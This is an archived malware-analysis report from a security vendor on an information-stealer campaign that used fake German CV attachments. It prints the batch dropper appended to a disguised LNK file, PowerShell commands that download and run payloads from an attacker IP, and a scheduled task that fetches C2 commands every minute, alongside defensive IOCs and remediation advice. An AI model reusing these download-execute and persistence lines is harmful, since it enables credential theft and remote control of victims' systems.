{
    "id": "bf12f9dd-c89c-4120-ad48-a00e21568cf0",
    "created_at": "2023-01-12T15:08:51.556172Z",
    "updated_at": "2025-03-27T02:05:29.505883Z",
    "deleted_at": null,
    "sha1_hash": "504a1a086cf23a1a3c1e3b8c1ebf7250ac3f8862",
    "title": "2020-05-19 - Information Stealer Campaign Targeting German HR Contacts",
    "authors": "",
    "file_creation_date": "2022-05-28T04:51:23Z",
    "file_modification_date": "2022-05-28T04:51:23Z",
    "file_size": 528992,
    "plain_text": "# Information Stealer Campaign Targeting German HR Contacts\n\n**[hornetsecurity.com/en/security-information/information-stealer-campaign-targeting-german-hr-contacts/](https://www.hornetsecurity.com/en/security-information/information-stealer-campaign-targeting-german-hr-contacts/)**\n\nSecurity Lab May 19, 2020\n\n## Summary\n\nHornetsecurity’s Security Lab presents insights into a long running information stealer campaign. The campaign is running\nvirtually unchanged since 2019-07-22. But due to the deployed living of the land scripting style malware used in the campaign\nthe anti-virus detection of the deployed information stealing script remains low. The campaign uses a fake CV file to target\nGerman language institutions using email addresses predominantly found as HR contacts on the targeted institutions’ job\nlistings. The detailed analysis of the targeting outlines the social engineering risk that public facing employees are exposed to.\n\n## Background\n\nAs so many the attack starts with an email:\n\n\n-----\n\nThe emails language is German. The campaign hence targets German speaking recipients.\n\nOpening the attachment a file named `lebenslauf (engl. curriculum vitae) is revealed:`\n\nAfter launching, what appears to be an image file, the victim is presented with an apparently broken image headlined\n“Lebenslauf” (engl. curriculum vitae):\n\nThe image file is not broken. The error message is part of the image. In the background a malware named LALALA InfoStealer\nby SonicWall [1] was downloaded and stole the victims credentials.\n\n\n-----\n\n## Technical Analysis\n\nThe technical analysis will first outline each stage of the infection chain leading to the LALALA InfoStealer batch file being\ndeployed, as depicted in the following flow graph:\n\nAfter outlining the infection chain insights into the targeting are provided.\n\n\n-----\n\n### Email\n\nThe chain of the attack starts with an email. It purports to be written in German language. However, it was written by entities not\nfamiliar with German orthography. Instead of using the proper German grapheme `ß (Eszett) the email uses the visually similar`\n```\nB from the Latin alphabet. Further the diacritical marks of the German Umlauts are missing. The email uses u instead of ü .\n\n```\nAlso capitalization of “Lebenslauf” in the email subject is missing.\n\nThe emails are send from email addresses following the pattern `[firstname.]lastname@vodafonemail.de . They are send`\nfrom the legitimate mail servers of `vodafonemail.de, hence pass SPF checks.`\n\nIt is unknown whether the sending accounts have been compromised because registering a `vodafonemail.de email address`\nis free and available to the general public. Overall (in all waves) 44 different emails have been used. 30 different emails have\nbeen used in the latest wave of the campaign.\n\n### ISO File\n\nThe attached ISO file contains one LNK file. Windows automatically mounts ISO files and displays their content in the file\nexplorer.\n\n### LNK File\n\nMetadata of the LNK (shell link) file are as follows:\n\n\n-----\n\n```\n                   jp g\nExifTool Version Number     : 11.70\nFile Name            : lebenslauf_2020_3_20.jpeg.lnk\n[...]\nFlags              : IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, ExpString, ExpIcon,\nTargetMetadata\nFile Attributes         : Archive\nCreate Date           : 2010:11:21 04:23:55+01:00\nAccess Date           : 2010:11:21 04:23:55+01:00\nModify Date           : 2010:11:21 04:23:55+01:00\nTarget File Size        : 345088\nIcon Index           : 16\nRun Window           : Show Minimized No Activate\nHot Key             : (none)\nTarget File DOS Name      : cmd.exe\nDrive Type           : Fixed Disk\nVolume Label          : \nLocal Base Path         : C:\\Windows\\System32\\cmd.exe\nRelative Path          : ..\\..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe\nCommand Line Arguments     : /C \"replace /a Lebenslauf_2020_3_20.jpeg.lnk \"%temp%\"&ren\n\"%temp%\\Lebenslauf_2020_3_20.jpeg.lnk\" 977gh.bat &start \"\" /MIN \"%TEMP%\\977gh.bat\"\nIcon File Name         : C:\\Windows\\System32\\imageres.dll\nFill Attributes         : 0x07\nPopup Fill Attributes      : 0xf5\nScreen Buffer Size       : 80 x 300\nWindow Size           : 80 x 25\nWindow Origin          : 0 x 0\nFont Size            : 8 x 12\nFont Family           : Modern\nFont Weight           : 400\nFont Name            : Terminal\nCursor Size           : 25\nFull Screen           : No\nQuick Edit           : No\nInsert Mode           : Yes\nWindow Origin Auto       : Yes\nHistory Buffer Size       : 50\nNum History Buffers       : 4\nRemove History Duplicates    : No\n\n```\nSetting the `Icon filename to` `C:\\Windows\\System32\\imageres.dll results in the LNK file displaying the icon of the`\n```\nimageres.dll, which is an image icon that Windows also displays for image files for which no preview can be generated.\n\n```\nThis way the LNK file is camouflaged as a JPEG file to the regular user, especially when Windows is set to hide file extensions,\nin this case the trailing `.lnk of the` `lebenslauf_2020_3_20.jpeg.lnk filename:`\n\nFurther when `lebenslauf_2020_3_20.jpeg.lnk is launched` `cmd.exe is called with the above listed` `Command Line`\nparameter. The `Command Line contains three chained commands:`\n\n\n-----\n\n1. `replace /a Lebenslauf_2020_3_20.jpeg.lnk %temp%`, which moves the `Lebenslauf_2020_3_20.jpeg.lnk to`\nthe `%temp% directory.`\n2. `ren \"%temp%\\Lebenslauf_2020_3_20.jpeg.lnk\" 977gh.bat, which renames the`\n```\n   Lebenslauf_2020_3_20.jpeg.lnk to 977gh.bat .\n\n```\n3. `start \"\" /MIN \"%TEMP%\\977gh.bat\", which launches` `%TEMP%\\977gh.bat in a minimized ( /MIN parameter)`\n\nwindow, without a title ( \"\" parameter).\n\nThis means the `lebenslauf_2020_3_20.jpeg.lnk is launched as a batch script file. And indeed the LNK file has a batch`\nscript appended:\n```\n$ cat -v lebenslauf_2020_3_20.jpeg.lnk\n[...]\n-^?^@^@^@M-^?M-^?^@M-^?^@^@^@M-^?^@M-^?^@M-^?M-^?^@^@M-^?M-^?M-^?^@^@^@^@^@^M\n^M\n^M\n@ECHO OFF^M\n^M\n^M\nIF EXIST \"%temp%\\9o0.txt\" (^M\n\"%temp%\\lebenslauf_2020_3_20.jpeg\"^M\necho mhjhjgjhgjh >\"%temp%\\977gh.bat\"&& del /f /q \"%temp%\\977gh.bat\"^M\nEXIT^M\n) ELSE (^M\necho 9o0>>\"%temp%\\9o0.txt\"^M\npowershell iwr -Uri \"http://185.141.27.131/rar.exe\" -OutFile \"%temp%\\rar.exe\"^M\npowershell iwr -Uri \"http://185.141.27.131/9o0.rar\" -OutFile \"%temp%\\9o0.rar\"^M\n\"%temp%\\rar.exe\" e -y \"%temp%\\9o0.rar\" \"%temp%\\\"^M\n\"%temp%\\lebenslauf_2020_3_20.jpeg\"^M\npowershell start-Process -FilePath \"%temp%\\9o0.bat\" -WindowStyle hidden^M\necho hjhjgj >\"%temp%\\977gh.bat\"&& del /f /q \"%temp%\\977gh.bat\"^M\nEXIT^M\n)^M\nEXIT^M\nkjhjjyykyuyuyuiyuiyiu\n\n```\nThe script first checks if `%temp%\\9o0.txt exists.`\n\nIn case it does not exist, it writes `9a0 to` `%temp%\\9o0.txt . Then uses PowerShell to download` `rar.exe and` `9o0.rar .`\n```\nrar.exe is a legitimate and signed copy of the command line RAR utility by Alexander Roshal. The rar.exe is then used to\n\n```\nextract the `9o0.rar . It contains:`\n```\n$ tree\n.\n|-- 9o0.bat\n|-- lebenslauf_2020_3_20.jpeg\n`-- sqlite3.exe\n0 directories, 3 files\n\n```\nThe script then launches `%temp%\\lebenslauf_2020_3_20.jpeg . This displays the following image:`\n\nWhile the image seems corrupted and even displays an error, it is working as intended, i.e., the error message as well as the\nimage corruption are part of the image.\n\nThen the LALALA InfoStealer residing in the downloaded `9o0.bat is started.`\n\n\n-----\n\nIn case the `%temp%\\9o0.txt file does exist, the initial script opens` `%temp%\\lebenslauf_2020_3_20.jpeg then overwrites`\nand deletes `%temp%\\977gh.bat, i.e., the initial script overwrites and deletes itself.`\n\n### LALALA InfoStealer batch script ( 9o0.bat )\n\nThe stealer script has a total of 135 lines of code with a total of 11390 characters:\n```\n$ wc 9o0.bat \n 135  616 11390 9o0.bat\n\n```\nIt has data stealing, exfiltration, and persistence mechanisms.\n\n**Stealing**\n\nFirst, the stealer uses PowerShell to query the list of installed software from the regisry keys `HKLM:\\Software\\`\n```\n[Wow6432Node\\]Microsoft\\Windows\\CurrentVersion\\Uninstall\\* . This information is written to\n\"%temp%\\gsgsd322\\proglist.txt .\n\n```\nAfter that a combination of PowerShell commands and invocations of `sqlite3.exe are used to steal passwords, cookies,`\ncredit card numbers, history from Chrome, Firefox, Thunderbird, Windows WebCache (used by Microsoft Edge), and Office\n(i.e. Outlook). The data is written into files stored in `\"%temp%\\gsgsd322\\ .`\n\n**Exfil**\n\nThe data, i.e., the contents of `\"%temp%\\gsgsd322\\, is then archived using the previously downloaded` `rar.exe into an`\narchive `%RMZ%.rar (with `%RMZ% being a random string) containing:`\n```\nUsers/\n`-- admin\n  `-- AppData\n    `-- Local\n      `-- Temp\n        `-- gsgsd322\n          |-- card123456\n          |-- cert9.db\n          |-- cooki123456\n          |-- cookies.sqlite\n          |-- edg_waPIIzu3\n          |-- key4.db\n          |-- logins.json\n          |-- outloo_waPIIzu3\n          |-- pass123456\n          |-- places.sqlite\n          |-- proglist.txt\n          |-- waPIIzu3\n          `-- WebCacheV01.dat\n5 directories, 13 files\n\n```\nThe above `%RMZ%.rar archive is then POSTed to` `185.141.27[.]131/9o0.php using PowerShell.`\n\n**Persistence and C2**\n\nIt schedules a task that is run every minute:\n```\nschtasks /create /tn \"%RMZ%\" /tr \"wscript '%temp%\\%RMZ%.vbs' 'powershell Invoke-Expression -Command:(iwr -uri\n185.141.27.131/gate990.php -method post -body '%RMZ%').content'\" /sc MINUTE\n\n```\nThe task uses a previous created VBS script:\n```\necho CreateObject(\"Wscript.Shell\").Run \"\" ^& WScript.Arguments(0) ^& \"\", 0, False >\"%temp%\\%RMZ%.vbs\"\n\n```\nThe task will, hence, download commands from `185.141.27[.]131/gate990.php every minute and execute them.`\n\n### Targeting\n\nThe latest observed wave was followed up the next day by a much smaller wave:\n\n\n-----\n\nThere was no significant shift in targeted recipients between the two waves.\n\nThe German language in the initial emails means the campaign targets Germany. This is further supported by analyzing the\ncountries associated with the recipient’s companies or entities (where known) from the last wave plotted above:\n\n\n-----\n\nOSINT research revealed the majority of recipient email addresses are or were listed as company contacts for job\n**listings. The recipient industry sectors (where known) are:**\n\n\n-----\n\nThe majority of the recipients are in the professional services sector. Manual evaluation indicates that the majority is comprised\nof (temporary) employment agencies. The second largest sector is health services. Manual evaluation indicates that the\nrecipients are mostly nursing homes and special care facilities. It is unknown whether the health service sector was specifically\ntargeted or if this observation is just a reflection of the available jobs on the German job market.\n\n### Past activity\n\nThis specific infection chain has been used in attacks since 2019-07-22. At that time using `lebenslauf_2019_6_6.img.lnk`\nas the filename. Interestingly, the subject line used to be correctly capitalized, but changed to all lower case in the beginning of\n2020:\n\n\n-----\n\nFrom this time histogram the individual waves of this campaign can be seen. The email text did not change, apart from adding\nthe spelling error in the subject line. The stealer itself also did not change, apart from changed C2 IPs and changed variable\nnames. Therefore it is quite surprising that the main batch script of the stealer still has very low anti-virus detection:\n\n## Conclusion and Remediation\n\nAttacks leveraging living of the land techniques via scripting pose a challenge for anti-virus detections. Hence, in a world where\ndetection of classic malware relying on malicious binaries is ever improving, malware using existing tools on the victims\ncomputer via scripts becomes more and more popular. Attacks using a good pretext for there initial email, in this case a job\napplication being send to recipients that are actually expecting job applications, increaes the chances of successful exection of\nthe malware. Combining this with the low anti-virus detection of the information stealer script, poses a significant risk of\ncredentials compromise to businesses and institutions.\n\nThe simplest way to prevent this specific attack vector is by disallowing specific email attachments. In this case the ISO format.\nUnless your business deals with those media files the pose more risk than benefit to your business. Further, Microsoft Outlook\ncan be configured to disallow specific malicious attachments from being opened. And last but not least extension hiding should\nbe disabled in the Windows operating system. This prevents malware from posing as different file types by appending a double\nextension, in this case `.jpeg.lnk to filenames. This way an alert user gets a fighting chance to spot the extension trickery.`\n\n\n-----\n\nTo remove a successful infection it is not enough to disable the task that was scheduled by the stealer. This will not get back\nstolen login credentials, and does not remove any other malware that may have been downloaded by the scheduled task set up\nby the stealer. Affected systems must immediately be disconnected from the network and be forensically analyzed before\nreconnecting them. Otherwise, potential dropped follow up malware could still be present on the system and in the worst case\ncould spread to other computers on the network. Last but not least, all login credentials of the affected user must be changed\nand activities since the infection up to the credential change must be reviewed.\n\nHornetsecurity’s [Spam and Malware Protection with the highest detection rates on the market already detected the LALALA](https://www.hornetsecurity.com/en/services/spam-filter/)\nInfoStealer emails when they first appeared via a generic detection signature.\n\n## References\n\n[1] [https://securitynews.sonicwall.com/xmlpost/lalala-infostealer-which-comes-with-batch-and-powershell-scripting-combo/](https://securitynews.sonicwall.com/xmlpost/lalala-infostealer-which-comes-with-batch-and-powershell-scripting-combo/)\n\n## Indicators of Compromise (IOCs)\n\n### Hashes\n\n**SHA256** **Filename** **Description**\n\n172b416f0574f6c9ba38de478faaf75781ea15b9ad67ebdaa1b9289487c71988 lebenslauf_2020_3_20.iso Malicious\nISO\nattachment\n\n254f722e11b7de73b53fb82d48f89f69639194027f9fc7c3724a640e4ebbf712 lebenslauf_2020_3_20.jpeg.lnk Malicious\nLNK file\ncontained in\nISO\n\n8b147861060fd9d6d90066457c54773cb0fdc65b87c07d4defe7d3cbe389ed37 9o0.bat LALALA\nInfoStealer\n\n3bb2d6a27ed46b5b356673264f56b8575880dc45cbcb656da6df74d4a84e1779 lebenslauf_2020_3_20.jpeg CV decoy\nerror image\n\n2e162d331c2475e0ba39cea969e0473896d3ff5e88cc92605ff2e24da3920768 sqlite3.exe SQLite3\nbinary\n(legitimate\n**NON**\n**MALICIOUS)**\n\n### URLs\n```\n   hxxp[:]//185.141.27[.]131/rar.exe\n   hxxp[:]//185.141.27[.]131/9o0.rar\n   hxxp[:]//185.141.27[.]131/firstga990.php (POST computer name and domain)\n   hxxp[:]//185.141.27[.]131/9o0.php (POST credential RAR)\n   hxxp[:]//185.141.27[.]131/gate990.php (download follow up malware)\n\n IPs\n\n```\n```\n185.141.27[.]131\n\n```\n\n### Senders\n\n```\n[firstname.]lastname@vodafonemail.de\n\n```\n\n### Subjects\n\n```\n[Ll]ebenslauf\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-19 - Information Stealer Campaign Targeting German HR Contacts.pdf"
    ],
    "report_names": [
        "2020-05-19 - Information Stealer Campaign Targeting German HR Contacts.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536131,
    "ts_updated_at": 1743041129,
    "ts_creation_date": 1653713483,
    "ts_modification_date": 1653713483,
    "files": {
        "pdf": "https://archive.orkl.eu/504a1a086cf23a1a3c1e3b8c1ebf7250ac3f8862.pdf",
        "text": "https://archive.orkl.eu/504a1a086cf23a1a3c1e3b8c1ebf7250ac3f8862.txt",
        "img": "https://archive.orkl.eu/504a1a086cf23a1a3c1e3b8c1ebf7250ac3f8862.jpg"
    }
}